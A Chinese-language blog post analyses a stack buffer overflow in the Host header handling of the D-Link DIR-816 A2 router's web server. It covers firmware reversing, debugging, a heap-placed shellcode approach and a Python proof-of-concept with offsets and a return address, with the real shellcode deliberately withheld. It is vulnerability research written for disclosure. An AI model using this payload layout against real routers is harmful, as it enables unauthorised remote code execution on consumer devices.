---
title: Dlink DIR-816 stack-based buffer overflow anaysis
categories:
  - exploit
tags: router-exploitation
published: true
---

# Introduction

在 [sakura](http://eternalsakura13.com/) 师傅的指导下开始尝试挖掘路由器的漏洞。

本文描述了作者对 Dlink DIR-816 A2 型号的路由器固件进行分析从触发 crash 到完整的漏洞利用过程，漏洞已提交厂商，
尚未获得厂商回复，安全起见这里只描述一下思路，不放出最终漏洞利用代码。

之前尝试 qemu 模拟路由器 web 服务运行达不到较好的效果，大部分无法直接运行。按照 0day 路由器那本书上的第一个
实验对象 DIR-815 的缓冲区溢出实验给出的步骤而进行环境修复最后勉强跑起来，但是无法响应请求。。，之后又试了下
totolink 的一款路由，环境修复后发现可以正常运行，尝试发送一个请求，然后惊奇的发现 web 目录是空的。。可能以我目
前的水平用 qemu 无法做到较好的调试。所以我就直接上京东看了下销量靠前的 D-link 路由器（看了下 D-link 的 cve
比较多可能比较好挖）然后买了个二手的 DIR-816，sakura 师傅说直接逆向开挖，然后就直接开始分析。

# Firmware Analysis - trigger crash

从 [Dlink官网](http://support.dlink.com.cn/ProductInfo.aspx?m=DIR-816) 下载A2型号最新版本的固件，
对固件进行解包后浏览了下目录，发现 goahead web应用程序，直接开始逆向分析，从 main 函数入手，想着先找一个 auth
bypass 试试。这里不得不称赞一下ida pro，用 radare2 和 ida pro 分别分析了一下，ida 体现出了它符号分析与字符串
关联的强大之处，用 radare2 进行分析遇到变量之间进行计算之后得到的数据地址如一些字符串无法标注出来，甚至有些
字符串无法添加到字符串索引中，而 ida 则会将其相关联的字符串标注出来，对理解函数逻辑起到很好的帮助作用。

一开始程序只是做一些初始化的操作，比如启动各种服务，打印一些日志，然后配置网络，监听 80 端口。在处理各种 http
请求之前会先初始一个未登录用户 token, 保存在 `/etc/RAMConfig/tokenid` 中，想着这可能是一个有用的点，就先记着。

![]({{site.baseurl}}/images/18-5-11-1.png)

只靠静态分析这么干看着有些较长的逻辑脑子缓存不够，容易从中间断掉，所以一般还是比较喜欢静态浏览一遍，接着动态一
边调一边看看每个指令，观察每次操作寄存器、内存的变化。最新版的升级固件发行说明是提升无线性能，加强安全管理，
看了下发现其实是删掉了 telnetd，无法直接连上去然后传一个 gdbserver 上去 attach web 进程。不过它的上一个版本有
telnetd，就换成了旧的版本，至于新版本是否修补了旧版本的漏洞暂时不管，只想体验一下成功调试的感觉 T-T。

固件更换完之后设置开启telnetd，然后telnet 连上去空密码登录，tftp 传一个
[gdbserver](https://github.com/rapid7/embedded-tools/tree/master/binaries/gdbserver) ，github 上的这个 7.8 版本
莫名的好用，反而自己重新编译了跟自己 gdb 版本一致的连上去出错。

![]({{site.baseurl}}/images/18-5-11-2.png)

调试器选择的是 gdb + gef，用起来挺顺手，ida 和 radare2 也可以远程调试，但没有那么方便。

![]({{site.baseurl}}/images/18-5-11-3.png)

在 web server 运行中 attach 上去断在了监听 80 端口 socket 连接处。之前一部分初始化操作可以用 gdbserver 直接运行
查看调试，大致是初始了对各种功能请求的 UrlHander。

用 radare2 分析的结果：

![]({{site.baseurl}}/images/18-5-11-4.png)

用 ida 看就可以更清晰的理解这段操作的含义，

![]({{site.baseurl}}/images/18-5-11-5.png)

分别是对 goform、cgi-bin、sharefile 功能请求的函数的初始化。

本想继续跟下去看看登录验证的部分，不过在 main 函数中不好找，处理完各种初始化就开始监听请求，请求发过来之后不知
到往哪断，想起程序名称是 goahead，就上网找 goahead 源码，暂时不知道是什么版本的就把官网上列的 4.x 和 3.x 版本
下下来，参考一下。其实可以断在处理 socket 的前面，一直往后跟，不过这样要跟太多步，当时发现程序有源码，就先看
源码去了。

大致了解了下程序的整个的轮廓，选择断在处理 Url 请求的 `websUrlHanderRequest` 函数处进行分析，本着先找一个登录
验证绕过漏洞的目标，在浏览源码的过程注意到了程序一个处理的逻辑，就是对 http 请求头 Host 字段的值进行判断请求是否
来自本地，若是来自本地的请求则取消登录验证，然后就尝试修改Host字段。用 BurpSuite 抓包进行修改，改成 "localhost"
看看能不能绕过登录验证，发生构造的请求后发现并没有成功。

分析到这里想尝试一下 fuzz 顺便也可以学习一下，在上工具之前先手动 fuzz 了一下，对不同字段进行加长，看看会不会
发生像之前做的实验一样 cookie 过长发生缓冲区溢出了。在试了一通几万字节的字符串无果之后对溢出暂时放下了，回过头来
继续分析程序逻辑，看看之前 Host 字段判断本地具体逻辑，发现好像直接触发 websRedirect Url 跳转了。

然后在没有什么思路的情况下对各种 Url 各种字段尝试，由于一直对 Host 字段耿耿于怀，就对 Host 字段构造了超长字符
串，然后请求认证成功后才能访问的页面这样会触发 Url 跳转，在这里面的逻辑中由于未对复制到栈上的字符串长度进行
限制而产生了栈缓冲区溢出触发了 Crash !!!

来看一下这个 crash 的位置，经过分析漏洞代码是 websRedirect　函数中位于 `0x41EAE4`　位置处的一段代码，对字符串
复制没有长度限制，只是判断遇到空字节或者换行符结束。

![]({{site.baseurl}}/images/18-5-11-10.png)

# Exploitation

怀着激动的心情确认了一下这个 crash 确实是 Host 字段超长引发的溢出，然后开始调利用代码。不得不说漏洞利用是一门
非常具有挑战性的艺术，前面迷茫挖洞耗费的时间只是后面写利用所花费时间的三分之二，不过也有可能是我太菜了QAQ。

路由器是开启了 aslr 的，常规思路找信息泄露然后 rop，发送过去的 Host 在返回请求时会被当成错误提示打印出来，然后分析了一下
字符串复制的逻辑是以换行符和空字符结束，就算字符串是换行符结尾最后还要补一个空字节，所以这里试了一段时间想要泄露
libc 地址后来发现不可行，因为复制完后补了一个空字符，就打印不了后面的信息了。但是这里堆栈是可执行的，而且堆的
地址固定，所以还可以执行 shellcode。

这里发现和以前打 ctf 做 pwn 类型题不一样的是 socket 连接不是一直开启的，每次发送 http 请求后服务器处理完返回一个
数据包 socekt 就关闭了，服务器继续等待下次连接。不能直接执行 `/bin/sh` 来获得 shell，还要执行稍微复杂一点的命令，
看了下其它的路由器栈溢出的利用代码一般是直接执行 telnetd，而这里测试目标最新版本固件是没有 telnetd 的，一直用的是
旧版本的固件，这里就需要比较复杂的 shellcode 了，暂时没有那么强的编写 shellcode 的能力，参照了网上一个弹方向
shell 的 shellcode。

最后是发送了超过 64k 字节大小的 http 请求才在堆上分配了一块内存放置 shellcode 执行成功了，幸运的是最新版本的
固件也存在这个漏洞。

验证一下poc代码：

```
# Tested product: DIR-816 (CN)
# Hardware version: A2
# Firmware version: v1.10B05 (2018/01/04)
# Firmware name: DIR-816A2_FWv1.10CNB05_R1B011D88210.img
#

import socket

p = socket.socket(socket.AF_INET, socket.SOCK_STREAM)                 
p.connect(("192.168.0.1" , 80))

shellcode = "A"*0x200   # *** Not the correct shellcode for exploit ***

rn = "\r\n"
strptr = "\x60\x70\xff\x7f"
padding = "\x00\x00\x00\x00"

payload = "GET /sharefile?test=A" + "HTTP/1.1" + rn
payload += "Host: " + "A"*0x70 + strptr*2 + "A"*0x24  + "\xb8\xfe\x48" + rn
payload += "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0" + rn
payload += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" + rn
payload += "Accept-Language: en-US,en;q=0.5" + rn
payload += "Accept-Encoding: gzip, deflate" + rn
payload += "Cookie: curShow=; ac_login_info=passwork; test=A" + padding*0x200 + shellcode + padding*0x4000 + rn
payload += "Connection: close" + rn
payload += "Upgrade-Insecure-Requests: 1" + rn
payload += rn

p.send(payload)
print p.recv(4096)
```

断在堆上的地址 `0x48feb8`　处：

![]({{site.baseurl}}/images/18-5-11-8.png)

运行poc：

![]({{site.baseurl}}/images/18-5-11-9.png)

完整 shellcode 测试结果：

![]({{site.baseurl}}/images/18-5-11-6.png)

![]({{site.baseurl}}/images/18-5-11-7.png)

# Summary

这个漏洞的影响貌似没有那么广，shodan 和 zoomeye
看了下公网没有找到这个型号的路由开放 web 服务，也许是因为默认的配置只在子网中开放 web 服务。
然后比较奇怪的是 D Link 只在中国区找的到这个型号的路由，国外官网貌似没有这款路由
emm.. 希望这能算是挖到漏洞吧 0.0。最后，感谢对我悉心指导的 sakura 师傅，也希望漏洞能提交成功 QVQ 。
